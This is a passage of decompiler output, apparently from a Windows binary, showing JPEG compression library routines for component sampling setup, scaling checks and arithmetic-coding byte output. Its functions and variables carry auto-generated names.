        in_EAX[iVar3 + 0x45] = iVar2 + piVar1[iVar3 + 1] * 0x58;
        iVar3 = iVar3 + 1;
      } while (iVar3 != iVar4);
    }
    if (*(char *)(in_EAX + 0x3e) != '\0') {
      in_EAX[0x56] = piVar1[5];
      in_EAX[0x57] = piVar1[6];
      in_EAX[0x58] = piVar1[7];
      in_EAX[0x59] = piVar1[8];
      return;
    }
  }
  in_EAX[0x56] = 0;
  in_EAX[0x57] = in_EAX[0x5a] * in_EAX[0x5a] + -1;
  in_EAX[0x58] = 0;
  in_EAX[0x59] = 0;
  return;
}



void FUN_0040e3cc(void)

{
  int iVar1;
  uint uVar2;
  code **ppcVar3;
  int *in_EAX;
  int iVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  int iVar8;
  
  iVar4 = in_EAX[0x44];
  if (iVar4 == 1) {
    iVar4 = in_EAX[0x45];
    in_EAX[0x49] = *(int *)(iVar4 + 0x1c);
    uVar7 = *(uint *)(iVar4 + 0x20);
    in_EAX[0x4a] = uVar7;
    *(undefined4 *)(iVar4 + 0x38) = 1;
    *(undefined4 *)(iVar4 + 0x3c) = 1;
    *(undefined4 *)(iVar4 + 0x40) = 1;
    *(undefined4 *)(iVar4 + 0x44) = *(undefined4 *)(iVar4 + 0x24);
    *(undefined4 *)(iVar4 + 0x48) = 1;
    uVar7 = uVar7 % *(uint *)(iVar4 + 0xc);
    if (uVar7 == 0) {
      uVar7 = *(uint *)(iVar4 + 0xc);
    }
    *(uint *)(iVar4 + 0x4c) = uVar7;
    in_EAX[0x4b] = 1;
    in_EAX[0x4c] = 0;
  }
  else {
    if (3 < iVar4 - 1U) {
      iVar1 = *in_EAX;
      *(undefined4 *)(iVar1 + 0x14) = 0x1b;
      *(int *)(iVar1 + 0x18) = iVar4;
      *(undefined4 *)(*in_EAX + 0x1c) = 4;
      (**(code **)*in_EAX)();
    }
    iVar4 = FUN_0040c1a8(in_EAX[0x10],in_EAX[0x3f] * in_EAX[0x5a]);
    in_EAX[0x49] = iVar4;
    iVar4 = FUN_0040c1a8(in_EAX[0x11],in_EAX[0x40] * in_EAX[0x5a]);
    in_EAX[0x4a] = iVar4;
    in_EAX[0x4b] = 0;
    if (0 < in_EAX[0x44]) {
      iVar4 = 0;
      do {
        iVar1 = in_EAX[iVar4 + 0x45];
        uVar7 = *(uint *)(iVar1 + 8);
        *(uint *)(iVar1 + 0x38) = uVar7;
        uVar2 = *(uint *)(iVar1 + 0xc);
        *(uint *)(iVar1 + 0x3c) = uVar2;
        iVar8 = uVar2 * uVar7;
        *(int *)(iVar1 + 0x40) = iVar8;
        *(uint *)(iVar1 + 0x44) = *(int *)(iVar1 + 0x24) * uVar7;
        uVar6 = *(uint *)(iVar1 + 0x1c) % uVar7;
        if (uVar6 == 0) {
          uVar6 = uVar7;
        }
        *(uint *)(iVar1 + 0x48) = uVar6;
        uVar7 = *(uint *)(iVar1 + 0x20) % uVar2;
        if (uVar7 == 0) {
          uVar7 = uVar2;
        }
        *(uint *)(iVar1 + 0x4c) = uVar7;
        if (10 < in_EAX[0x4b] + iVar8) {
          ppcVar3 = (code **)*in_EAX;
          ppcVar3[5] = (code *)0xe;
          (**ppcVar3)();
        }
        if (0 < iVar8) {
          iVar1 = in_EAX[0x4b];
          iVar5 = 0;
          do {
            *(int *)((int)in_EAX + iVar5 + iVar1 * 4 + 0x130) = iVar4;
            iVar5 = iVar5 + 4;
          } while (iVar5 != iVar8 * 4);
          in_EAX[0x4b] = iVar8 + iVar1;
        }
        iVar4 = iVar4 + 1;
      } while (iVar4 < in_EAX[0x44]);
    }
  }
  if (0 < in_EAX[0x39]) {
    iVar4 = in_EAX[0x39] * in_EAX[0x49];
    if (0xffff < iVar4) {
      iVar4 = 0xffff;
    }
    in_EAX[0x38] = iVar4;
  }
  return;
}



void __cdecl FUN_0040e77c(int *param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  
  uVar4 = param_1[7];
  if ((uVar4 >> 0x18 != 0) || (*(char *)((int)param_1 + 0x23) != '\0')) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x2a;
    *(undefined4 *)(iVar3 + 0x18) = 0xffdc;
    (**(code **)*param_1)(param_1);
    uVar4 = param_1[7];
  }
  uVar1 = param_1[0xe];
  iVar3 = param_1[0x5a];
  uVar2 = param_1[0xf] * iVar3;
  if (uVar1 < uVar2) {
    if (uVar2 < uVar1 * 2 || uVar2 + uVar1 * -2 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,2);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],2);
      param_1[0x11] = iVar3;
      param_1[0x41] = 2;
      param_1[0x42] = 2;
      return;
    }
    if (uVar2 < uVar1 * 3 || uVar2 + uVar1 * -3 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,3);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],3);
      param_1[0x11] = iVar3;
      param_1[0x41] = 3;
      param_1[0x42] = 3;
      return;
    }
    if (uVar2 < uVar1 * 4 || uVar2 + uVar1 * -4 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,4);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],4);
      param_1[0x11] = iVar3;
      param_1[0x41] = 4;
      param_1[0x42] = 4;
    }
    else if (uVar2 < uVar1 * 5 || uVar2 + uVar1 * -5 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,5);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],5);
      param_1[0x11] = iVar3;
      param_1[0x41] = 5;
      param_1[0x42] = 5;
    }
    else if (uVar2 < uVar1 * 6 || uVar2 + uVar1 * -6 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,6);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],6);
      param_1[0x11] = iVar3;
      param_1[0x41] = 6;
      param_1[0x42] = 6;
    }
    else if (uVar2 < uVar1 * 7 || uVar2 + uVar1 * -7 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,7);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],7);
      param_1[0x11] = iVar3;
      param_1[0x41] = 7;
      param_1[0x42] = 7;
    }
    else if (uVar2 < uVar1 * 8 || uVar2 + uVar1 * -8 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,8);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],8);
      param_1[0x11] = iVar3;
      param_1[0x41] = 8;
      param_1[0x42] = 8;
    }
    else if (uVar2 < uVar1 * 9 || uVar2 + uVar1 * -9 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,9);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],9);
      param_1[0x11] = iVar3;
      param_1[0x41] = 9;
      param_1[0x42] = 9;
    }
    else if (uVar2 < uVar1 * 10 || uVar2 + uVar1 * -10 == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,10);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],10);
      param_1[0x11] = iVar3;
      param_1[0x41] = 10;
      param_1[0x42] = 10;
    }
    else if (uVar2 < uVar1 * 0xb || uVar2 + uVar1 * -0xb == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,0xb);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],0xb);
      param_1[0x11] = iVar3;
      param_1[0x41] = 0xb;
      param_1[0x42] = 0xb;
    }
    else if (uVar2 < uVar1 * 0xc || uVar2 + uVar1 * -0xc == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,0xc);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],0xc);
      param_1[0x11] = iVar3;
      param_1[0x41] = 0xc;
      param_1[0x42] = 0xc;
    }
    else if (uVar2 < uVar1 * 0xd || uVar2 + uVar1 * -0xd == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,0xd);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],0xd);
      param_1[0x11] = iVar3;
      param_1[0x41] = 0xd;
      param_1[0x42] = 0xd;
    }
    else if (uVar2 < uVar1 * 0xe || uVar2 + uVar1 * -0xe == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,0xe);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],0xe);
      param_1[0x11] = iVar3;
      param_1[0x41] = 0xe;
      param_1[0x42] = 0xe;
    }
    else if (uVar2 < uVar1 * 0xf || uVar2 + uVar1 * -0xf == 0) {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,0xf);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],0xf);
      param_1[0x11] = iVar3;
      param_1[0x41] = 0xf;
      param_1[0x42] = 0xf;
    }
    else {
      iVar3 = FUN_0040c1a8(uVar4 * iVar3,0x10);
      param_1[0x10] = iVar3;
      iVar3 = FUN_0040c1a8(param_1[8] * param_1[0x5a],0x10);
      param_1[0x11] = iVar3;
      param_1[0x41] = 0x10;
      param_1[0x42] = 0x10;
    }
  }
  else {
    param_1[0x10] = uVar4 * iVar3;
    param_1[0x11] = iVar3 * param_1[8];
    param_1[0x41] = 1;
    param_1[0x42] = 1;
  }
  return;
}



void __cdecl FUN_0040ed40(int *param_1,char param_2)

{
  char cVar1;
  code **ppcVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int iVar5;
  int iVar6;
  undefined4 *puVar7;
  int iVar8;
  undefined4 *puVar9;
  int iVar10;
  int iVar11;
  undefined4 *puVar12;
  int iStack_2c;
  
  puVar4 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x20);
  param_1[0x5d] = (int)puVar4;
  *puVar4 = &LAB_0040e5a4;
  puVar4[1] = &LAB_0040e320;
  puVar4[2] = &LAB_0040e354;
  *(undefined *)((int)puVar4 + 0xd) = 0;
  if (param_2 == '\0') {
    FUN_0040e77c(param_1);
    iVar6 = param_1[0x5a];
  }
  else {
    iVar6 = param_1[0x41];
    if (iVar6 != param_1[0x42]) {
      iVar8 = *param_1;
      *(undefined4 *)(iVar8 + 0x14) = 7;
      *(int *)(iVar8 + 0x18) = iVar6;
      *(int *)(*param_1 + 0x1c) = param_1[0x42];
      (**(code **)*param_1)(param_1);
      iVar6 = param_1[0x41];
    }
    param_1[0x5a] = iVar6;
  }
  if (0xf < iVar6 - 1U) {
    iVar8 = *param_1;
    *(undefined4 *)(iVar8 + 0x14) = 7;
    *(int *)(iVar8 + 0x18) = iVar6;
    *(int *)(*param_1 + 0x1c) = param_1[0x5a];
    (**(code **)*param_1)(param_1);
    iVar6 = param_1[0x5a];
  }
  switch(iVar6) {
  default:
    param_1[0x5b] = (int)&DAT_00426f00;
    if (iVar6 < 8) break;
    param_1[0x5c] = 0x3f;
    iVar6 = param_1[0x11];
    if (iVar6 != 0) goto LAB_0040f13c;
    goto LAB_0040ee0e;
  case 2:
    param_1[0x5b] = (int)&DAT_00426ae0;
    break;
  case 3:
    param_1[0x5b] = (int)&DAT_00426b40;
    break;
  case 4:
    param_1[0x5b] = (int)&DAT_00426bc0;
    break;
  case 5:
    param_1[0x5b] = (int)&DAT_00426c40;
    break;
  case 6:
    param_1[0x5b] = (int)&DAT_00426d00;
    break;
  case 7:
    param_1[0x5b] = (int)&DAT_00426de0;
  }
  param_1[0x5c] = iVar6 * iVar6 + -1;
  iVar6 = param_1[0x11];
  if (iVar6 == 0) {
LAB_0040ee0e:
    ppcVar2 = (code **)*param_1;
    ppcVar2[5] = (code *)0x21;
    (**ppcVar2)(param_1);
    if (0xffdc < param_1[0x11]) goto LAB_0040f168;
LAB_0040ee2a:
    if (0xffdc < param_1[0x10]) goto LAB_0040f168;
  }
  else {
LAB_0040f13c:
    if (((param_1[0x10] == 0) || (param_1[0x13] < 1)) || (param_1[9] < 1)) goto LAB_0040ee0e;
    if (iVar6 < 0xffdd) goto LAB_0040ee2a;
LAB_0040f168:
    iVar6 = *param_1;
    *(undefined4 *)(iVar6 + 0x14) = 0x2a;
    *(undefined4 *)(iVar6 + 0x18) = 0xffdc;
    (**(code **)*param_1)(param_1);
  }
  iVar6 = param_1[0x12];
  if (iVar6 != 8) {
    iVar8 = *param_1;
    *(undefined4 *)(iVar8 + 0x14) = 0x10;
    *(int *)(iVar8 + 0x18) = iVar6;
    (**(code **)*param_1)(param_1);
  }
  iVar6 = param_1[0x13];
  if (10 < iVar6) {
    iVar8 = *param_1;
    *(undefined4 *)(iVar8 + 0x14) = 0x1b;
    *(int *)(iVar8 + 0x18) = iVar6;
    *(undefined4 *)(*param_1 + 0x1c) = 10;
    (**(code **)*param_1)(param_1);
    iVar6 = param_1[0x13];
  }
  param_1[0x3f] = 1;
  param_1[0x40] = 1;
  iVar8 = param_1[0x15];
  if (iVar6 < 1) {
    iVar5 = 1;
  }
  else {
    iVar10 = 0;
    do {
      iVar11 = *(int *)(iVar8 + 8);
      if (((3 < iVar11 - 1U) || (iVar5 = *(int *)(iVar8 + 0xc), iVar5 < 1)) || (4 < iVar5)) {
        ppcVar2 = (code **)*param_1;
        ppcVar2[5] = (code *)0x13;
        (**ppcVar2)(param_1);
        iVar11 = *(int *)(iVar8 + 8);
        iVar5 = *(int *)(iVar8 + 0xc);
        iVar6 = param_1[0x13];
      }
      if (iVar11 < param_1[0x3f]) {
        iVar11 = param_1[0x3f];
      }
      param_1[0x3f] = iVar11;
      if (iVar5 < param_1[0x40]) {
        iVar5 = param_1[0x40];
      }
      param_1[0x40] = iVar5;
      iVar10 = iVar10 + 1;
      iVar8 = iVar8 + 0x58;
    } while (iVar10 < iVar6);
    iVar8 = param_1[0x15];
    if (0 < iVar6) {
      iStack_2c = 0;
      do {
        *(int *)(iVar8 + 4) = iStack_2c;
        for (iVar6 = 1;
            (iVar10 = param_1[0x41] * iVar6,
            iVar5 = (-(uint)(*(char *)(param_1 + 0x35) == '\0') & 0xfffffffc) + 8,
            iVar10 - iVar5 == 0 || iVar10 < iVar5 &&
            (param_1[0x3f] % (*(int *)(iVar8 + 8) * iVar6 * 2) == 0)); iVar6 = iVar6 << 1) {
        }
        *(int *)(iVar8 + 0x24) = iVar10;
        for (iVar6 = 1;
            (iVar11 = param_1[0x42] * iVar6,
            iVar5 = (-(uint)(*(char *)(param_1 + 0x35) == '\0') & 0xfffffffc) + 8,
            iVar11 - iVar5 == 0 || iVar11 < iVar5 &&
            (param_1[0x40] % (*(int *)(iVar8 + 0xc) * iVar6 * 2) == 0)); iVar6 = iVar6 << 1) {
        }
        *(int *)(iVar8 + 0x28) = iVar11;
        iVar6 = iVar11 * 2;
        if (iVar10 == iVar6 || SBORROW4(iVar10,iVar6) != iVar10 + iVar11 * -2 < 0) {
          iVar6 = iVar11 + iVar10 * -2;
          if (iVar6 != 0 && SBORROW4(iVar11,iVar10 * 2) == iVar6 < 0) {
            *(int *)(iVar8 + 0x28) = iVar10 * 2;
          }
        }
        else {
          *(int *)(iVar8 + 0x24) = iVar6;
        }
        iVar6 = FUN_0040c1a8(*(int *)(iVar8 + 8) * param_1[0x10],param_1[0x3f] * param_1[0x5a]);
        *(int *)(iVar8 + 0x1c) = iVar6;
        iVar6 = FUN_0040c1a8(param_1[0x11] * *(int *)(iVar8 + 0xc),param_1[0x40] * param_1[0x5a]);
        *(int *)(iVar8 + 0x20) = iVar6;
        iVar6 = FUN_0040c1a8(*(int *)(iVar8 + 8) * *(int *)(iVar8 + 0x24) * param_1[0x10],
                             param_1[0x3f] * param_1[0x5a]);
        *(int *)(iVar8 + 0x2c) = iVar6;
        iVar6 = FUN_0040c1a8(*(int *)(iVar8 + 0xc) * *(int *)(iVar8 + 0x28) * param_1[0x11],
                             param_1[0x40] * param_1[0x5a]);
        *(int *)(iVar8 + 0x30) = iVar6;
        *(undefined *)(iVar8 + 0x34) = 1;
        iStack_2c = iStack_2c + 1;
        iVar8 = iVar8 + 0x58;
      } while (iStack_2c < param_1[0x13]);
      iVar5 = param_1[0x40];
    }
  }
  iVar6 = FUN_0040c1a8(param_1[0x11],iVar5 * param_1[0x5a]);
  param_1[0x43] = iVar6;
  if (param_1[0x33] == 0) {
    *(undefined *)(param_1 + 0x3e) = 0;
    param_1[0x32] = 1;
LAB_0040f1ab:
    if (7 < param_1[0x5a]) goto joined_r0x0040f1d1;
    cVar1 = *(char *)((int)param_1 + 0xd1);
  }
  else {
    FUN_0040dda8();
    if (param_1[0x5a] < 8) {
      puVar3 = (undefined4 *)param_1[0x33];
      if (param_1[0x32] < 1) {
        iVar6 = 0;
      }
      else {
        iVar5 = 0;
        iVar6 = 0;
        iVar8 = param_1[0x5c];
        puVar7 = puVar3;
        while( true ) {
          if ((int)puVar3[iVar6 * 9 + 5] <= iVar8) {
            if (iVar8 < (int)puVar3[iVar6 * 9 + 6]) {
              puVar3[iVar6 * 9 + 6] = iVar8;
            }
            iVar6 = iVar6 + 1;
          }
          iVar5 = iVar5 + 1;
          if (param_1[0x32] <= iVar5) break;
          if (iVar5 == iVar6) {
            puVar7 = puVar7 + 9;
          }
          else {
            puVar7 = puVar7 + 9;
            puVar9 = puVar7;
            puVar12 = puVar3 + iVar6 * 9;
            for (iVar8 = 9; iVar8 != 0; iVar8 = iVar8 + -1) {
              *puVar12 = *puVar9;
              puVar9 = puVar9 + 1;
              puVar12 = puVar12 + 1;
            }
            iVar8 = param_1[0x5c];
          }
        }
      }
      param_1[0x32] = iVar6;
    }
    if (*(char *)(param_1 + 0x3e) == '\0') goto LAB_0040f1ab;
    cVar1 = *(char *)((int)param_1 + 0xd1);
  }
  if (cVar1 == '\0') {
    *(undefined *)((int)param_1 + 0xd2) = 1;
  }
joined_r0x0040f1d1:
  if (param_2 == '\0') {
    puVar4[4] = 0;
  }
  else {
    puVar4[4] = ~-(uint)(*(char *)((int)param_1 + 0xd2) == '\0') + 2;
  }
  puVar4[7] = 0;
  puVar4[5] = 0;
  if (*(char *)((int)param_1 + 0xd2) == '\0') {
    puVar4[6] = param_1[0x32];
    return;
  }
  puVar4[6] = param_1[0x32] << 1;
  return;
}



void __cdecl FUN_0040fc38(int param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x9c);
  *(undefined4 **)(param_1 + 400) = puVar1;
  *puVar1 = &LAB_0040f51c;
  puVar1[0x15] = 0;
  puVar1[0x23] = 0;
  puVar1[0x16] = 0;
  puVar1[0x24] = 0;
  puVar1[0x17] = 0;
  puVar1[0x25] = 0;
  puVar1[0x18] = 0;
  puVar1[0x26] = 0;
  return;
}



void __fastcall FUN_0040fed0(undefined4 param_1,int *param_2)

{
  int *piVar1;
  undefined *puVar2;
  int iVar3;
  code **ppcVar4;
  undefined in_AL;
  char cVar5;
  
  piVar1 = (int *)param_2[6];
  puVar2 = (undefined *)*piVar1;
  *puVar2 = in_AL;
  *piVar1 = (int)(puVar2 + 1);
  iVar3 = piVar1[1];
  piVar1[1] = iVar3 + -1;
  if (iVar3 + -1 == 0) {
    cVar5 = (*(code *)piVar1[3])(param_2);
    if (cVar5 == '\0') {
      ppcVar4 = (code **)*param_2;
      ppcVar4[5] = (code *)0x19;
      (**ppcVar4)(param_2);
      return;
    }
  }
  return;
}



undefined4 __cdecl FUN_0040ff18(int *param_1)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  int extraout_ECX;
  undefined4 extraout_ECX_00;
  int extraout_ECX_01;
  int extraout_ECX_02;
  int iVar5;
  undefined4 extraout_ECX_03;
  int extraout_ECX_04;
  int extraout_ECX_05;
  int extraout_ECX_06;
  int extraout_ECX_07;
  undefined4 extraout_ECX_08;
  int extraout_ECX_09;
  undefined4 unaff_EBX;
  
  iVar1 = param_1[0x65];
  uVar2 = *(int *)(iVar1 + 0xc) + -1 + *(int *)(iVar1 + 0x10) & 0xffff0000;
  if ((int)uVar2 < *(int *)(iVar1 + 0xc)) {
    uVar2 = uVar2 + 0x8000;
  }
  iVar5 = *(int *)(iVar1 + 0x1c);
  uVar2 = uVar2 << ((byte)iVar5 & 0x1f);
  *(uint *)(iVar1 + 0xc) = uVar2;
  if ((uVar2 & 0xf8000000) == 0) {
    if (*(int *)(iVar1 + 0x20) == 0) {
      *(int *)(iVar1 + 0x18) = *(int *)(iVar1 + 0x18) + 1;
    }
    else if (-1 < *(int *)(iVar1 + 0x20)) {
      iVar3 = *(int *)(iVar1 + 0x18);
      while (iVar3 != 0) {
        FUN_0040fed0(iVar5,param_1);
        iVar3 = *(int *)(iVar1 + 0x18) + -1;
        *(int *)(iVar1 + 0x18) = iVar3;
        iVar5 = extraout_ECX_07;
      }
      FUN_0040fed0(iVar5,param_1);
      iVar5 = extraout_ECX_06;
    }
    if (*(int *)(iVar1 + 0x14) != 0) {
      iVar5 = *(int *)(iVar1 + 0x18);
      iVar3 = iVar5;
      while (iVar3 != 0) {
        FUN_0040fed0(iVar5,param_1);
        iVar3 = *(int *)(iVar1 + 0x18) + -1;
        *(int *)(iVar1 + 0x18) = iVar3;
        iVar5 = extraout_ECX_02;
      }
      do {
        FUN_0040fed0(iVar5,param_1);
        FUN_0040fed0(extraout_ECX_03,param_1);
        iVar3 = *(int *)(iVar1 + 0x14) + -1;
        *(int *)(iVar1 + 0x14) = iVar3;
        iVar5 = extraout_ECX_04;
      } while (iVar3 != 0);
    }
    uVar2 = *(uint *)(iVar1 + 0xc);
  }
  else {
    if (-1 < *(int *)(iVar1 + 0x20)) {
      iVar5 = *(int *)(iVar1 + 0x18);
      iVar3 = iVar5;
      while (iVar3 != 0) {
        FUN_0040fed0(iVar5,param_1);
        iVar3 = *(int *)(iVar1 + 0x18) + -1;
        *(int *)(iVar1 + 0x18) = iVar3;
        iVar5 = extraout_ECX_05;
      }
      FUN_0040fed0(iVar5,param_1);
      iVar5 = extraout_ECX;
      if (*(int *)(iVar1 + 0x20) == 0xfe) {
        FUN_0040fed0(extraout_ECX,param_1);
        iVar5 = extraout_ECX_09;
      }
      uVar2 = *(uint *)(iVar1 + 0xc);
    }
    *(int *)(iVar1 + 0x18) = *(int *)(iVar1 + 0x18) + *(int *)(iVar1 + 0x14);
    *(undefined4 *)(iVar1 + 0x14) = 0;
  }
  if ((uVar2 & 0x7fff800) != 0) {
    iVar3 = *(int *)(iVar1 + 0x18);
    while (iVar3 != 0) {
      FUN_0040fed0(iVar5,param_1);
      iVar3 = *(int *)(iVar1 + 0x18) + -1;
      *(int *)(iVar1 + 0x18) = iVar3;
      iVar5 = extraout_ECX_01;
    }
    FUN_0040fed0(iVar5,param_1);
    uVar2 = *(uint *)(iVar1 + 0xc);
    uVar4 = extraout_ECX_00;
    if ((char)((int)uVar2 >> 0x13) == -1) {
      FUN_0040fed0(extraout_ECX_00,param_1);
      uVar2 = *(uint *)(iVar1 + 0xc);
      uVar4 = extraout_ECX_08;
    }
    if (((uVar2 & 0x7f800) != 0) &&
       (FUN_0040fed0(uVar4,param_1), (char)(*(int *)(iVar1 + 0xc) >> 0xb) == -1)) {
      uVar4 = FUN_0040fed0(unaff_EBX,param_1);
      return uVar4;
    }
  }
  return unaff_EBX;
}



void __fastcall FUN_004100d8(int param_1,byte *param_2)

{
  byte bVar1;
  int iVar2;
  int *in_EAX;
  int iVar3;
  int iVar4;
  undefined4 extraout_ECX;
  uint uVar5;
  uint extraout_ECX_00;
  undefined4 extraout_ECX_01;
  uint extraout_ECX_02;
  int extraout_ECX_03;
  uint extraout_ECX_04;
  uint extraout_ECX_05;
  int iVar6;
  uint uVar7;
  
  iVar2 = in_EAX[0x65];
  bVar1 = *param_2;
  iVar6 = *(int *)(&DAT_004271c0 + (bVar1 & 0x7f) * 4);
  iVar3 = iVar6 >> 0x10;
  iVar4 = *(int *)(iVar2 + 0x10) - iVar3;
  *(int *)(iVar2 + 0x10) = iVar4;
  if ((int)(uint)bVar1 >> 7 == param_1) {
    if (0x7fff < iVar4) {
      return;
    }
    if (iVar4 < iVar3) {
      *(int *)(iVar2 + 0xc) = *(int *)(iVar2 + 0xc) + iVar4;
      *(int *)(iVar2 + 0x10) = iVar3;
    }
    *param_2 = bVar1 & 0x80 ^ (byte)((uint)iVar6 >> 8);
  }
  else {
    if (iVar3 <= iVar4) {
      *(int *)(iVar2 + 0xc) = *(int *)(iVar2 + 0xc) + iVar4;
      *(int *)(iVar2 + 0x10) = iVar3;
    }
    *param_2 = bVar1 & 0x80 ^ (byte)iVar6;
  }
  iVar6 = *(int *)(iVar2 + 0x10);
  do {
    iVar6 = iVar6 << 1;
    *(int *)(iVar2 + 0x10) = iVar6;
    uVar5 = *(int *)(iVar2 + 0xc) << 1;
    *(uint *)(iVar2 + 0xc) = uVar5;
    iVar3 = *(int *)(iVar2 + 0x1c) + -1;
    *(int *)(iVar2 + 0x1c) = iVar3;
    if (iVar3 == 0) {
      uVar7 = (int)uVar5 >> 0x13;
      if ((int)uVar7 < 0x100) {
        if (uVar7 == 0xff) {
          *(int *)(iVar2 + 0x14) = *(int *)(iVar2 + 0x14) + 1;
          iVar3 = 0;
        }
        else {
          if (*(int *)(iVar2 + 0x20) == 0) {
            *(int *)(iVar2 + 0x18) = *(int *)(iVar2 + 0x18) + 1;
          }
          else if (-1 < *(int *)(iVar2 + 0x20)) {
            iVar6 = *(int *)(iVar2 + 0x18);
            while (iVar6 != 0) {
              FUN_0040fed0(uVar5,in_EAX);
              iVar6 = *(int *)(iVar2 + 0x18) + -1;
              *(int *)(iVar2 + 0x18) = iVar6;
              uVar5 = extraout_ECX_05;
            }
            FUN_0040fed0(uVar5,in_EAX);
            uVar5 = extraout_ECX_04;
          }
          if (*(int *)(iVar2 + 0x14) != 0) {
            iVar6 = *(int *)(iVar2 + 0x18);
            while (iVar6 != 0) {
              FUN_0040fed0(uVar5,in_EAX);
              iVar6 = *(int *)(iVar2 + 0x18) + -1;
              *(int *)(iVar2 + 0x18) = iVar6;
              uVar5 = extraout_ECX_00;
            }
            do {
              FUN_0040fed0(uVar5,in_EAX);
              FUN_0040fed0(extraout_ECX_01,in_EAX);
              iVar6 = *(int *)(iVar2 + 0x14) + -1;
              *(int *)(iVar2 + 0x14) = iVar6;
              uVar5 = extraout_ECX_02;
            } while (iVar6 != 0);
          }
          *(uint *)(iVar2 + 0x20) = uVar7 & 0xff;
          uVar5 = *(uint *)(iVar2 + 0xc);
          iVar3 = *(int *)(iVar2 + 0x1c);
          iVar6 = *(int *)(iVar2 + 0x10);
        }
      }
      else {
        if (*(int *)(iVar2 + 0x20) < 0) {
          iVar3 = 0;
        }
        else {
          iVar6 = *(int *)(iVar2 + 0x18);
          iVar3 = iVar6;
          while (iVar3 != 0) {
            FUN_0040fed0(iVar6,in_EAX);
            iVar3 = *(int *)(iVar2 + 0x18) + -1;
            *(int *)(iVar2 + 0x18) = iVar3;
            iVar6 = extraout_ECX_03;
          }
          FUN_0040fed0(iVar6,in_EAX);
          if (*(int *)(iVar2 + 0x20) == 0xfe) {
            FUN_0040fed0(extraout_ECX,in_EAX);
          }
          uVar5 = *(uint *)(iVar2 + 0xc);
          iVar3 = *(int *)(iVar2 + 0x1c);
          iVar6 = *(int *)(iVar2 + 0x10);
        }
        *(int *)(iVar2 + 0x18) = *(int *)(iVar2 + 0x18) + *(int *)(iVar2 + 0x14);
        *(undefined4 *)(iVar2 + 0x14) = 0;
        *(uint *)(iVar2 + 0x20) = uVar7 & 0xff;
      }
      *(uint *)(iVar2 + 0xc) = uVar5 & 0x7ffff;
      *(int *)(iVar2 + 0x1c) = iVar3 + 8;
    }
  } while (iVar6 < 0x8000);
  return;
}



void FUN_004102f4(void)

{
  int iVar1;
  int iVar2;
  int *in_EAX;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar3;
  int iVar4;
  undefined *puVar5;
  int local_24;
  
  iVar1 = in_EAX[0x65];
  FUN_0040ff18(in_EAX);
  FUN_0040fed0(extraout_ECX,in_EAX);
  FUN_0040fed0(extraout_ECX_00,in_EAX);
  if (0 < in_EAX[0x44]) {
    iVar4 = 0;
    local_24 = iVar1;
    do {
      iVar2 = in_EAX[iVar4 + 0x45];
      if ((in_EAX[0x56] == 0) && (in_EAX[0x58] == 0)) {
        puVar5 = *(undefined **)(iVar1 + 0x4c + *(int *)(iVar2 + 0x14) * 4);
        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar5 = 0;
          puVar5 = puVar5 + 1;
        }
        *(undefined4 *)(local_24 + 0x24) = 0;
        *(undefined4 *)(local_24 + 0x34) = 0;
      }
      if (in_EAX[0x57] != 0) {
        puVar5 = *(undefined **)(iVar1 + 0x8c + *(int *)(iVar2 + 0x18) * 4);
        for (iVar3 = 0x100; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar5 = 0;
          puVar5 = puVar5 + 1;
        }
      }
      iVar4 = iVar4 + 1;
      local_24 = local_24 + 4;
    } while (iVar4 < in_EAX[0x44]);
  }
  *(undefined4 *)(iVar1 + 0xc) = 0;
  *(undefined4 *)(iVar1 + 0x10) = 0x10000;
  *(undefined4 *)(iVar1 + 0x14) = 0;
  *(undefined4 *)(iVar1 + 0x18) = 0;
  *(undefined4 *)(iVar1 + 0x1c) = 0xb;
